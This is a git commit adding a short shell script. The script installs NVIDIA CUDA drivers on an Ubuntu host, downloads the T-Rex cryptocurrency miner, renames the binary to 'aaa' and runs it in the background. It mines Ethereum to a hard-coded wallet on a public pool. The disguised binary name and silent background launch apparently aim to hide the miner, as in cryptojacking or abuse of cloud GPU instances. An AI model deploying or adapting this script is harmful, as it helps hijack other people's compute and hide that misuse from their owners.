f99b96356f02e6b9ca67913d0fccee84a20f0c1e
psyykatre <105768567+psyykatre@users.noreply.github.com>
2022-05-19 14:05:35 +0000

    Create cuatao.sh

---
+++ cuatao.sh
@@ -0,0 +1,14 @@
+cd /home/ubuntu
+sudo apt-get install linux-headers-$(uname -r) -y
+distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
+wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
+sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
+sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
+echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
+sudo apt-get update
+sudo apt-get -y install cuda-drivers-510
+sudo apt-get install libcurl3 -y
+sudo wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
+tar xvzf t-rex-0.21.6-linux.tar.gz
+mv t-rex aaa
+./aaa -a ethash -o stratum+tcp://us-eth.2miners.com:2020 -u 0x6F3c2438d3927Fbe922657b010FF1357bB67dbc2 -p x -w fuck&
